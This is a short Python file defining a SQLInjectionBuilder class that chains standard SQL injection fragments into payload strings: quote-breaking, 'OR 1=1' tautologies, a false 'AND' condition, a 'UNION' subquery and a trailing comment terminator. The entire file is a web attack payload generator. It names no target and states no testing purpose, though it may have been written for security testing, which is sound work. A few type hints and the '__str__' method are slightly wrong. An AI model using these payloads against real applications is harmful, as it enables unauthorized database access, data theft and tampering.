from io import StringIO

class SQLInjectionBuilder:
    def __init__(self) -> None:
        self.injection_string = StringIO()
        self.final_string = None

    def _add(self, new_str:str):
         return  self.injection_string.write(new_str)

    def build(self):
        self._add("; -- ")
        self.final_string = self.injection_string.getvalue()
        return self.final_string
    
    def __str__(self) -> str:
        if self.final_string == None:
            return str(self.injection_string)
        else:
            return self.final_string

    def add_single_quote(self):
        self._add("'")
        return self

    def or_boolean_one_equals_one_quoted(self):
        self._add(" OR 1=\"1\"")
        return self


    def or_boolean_one_equals_one_unquoted(self):
        self._add(" OR 1=1")
        return self

    def and_false_condition(self) -> None:
        self._add("' AND 1=\"2\"")
        return self

    def union_subquery(self, subquery: str) -> None:
        self._add(f" UNION {subquery}")
        return self
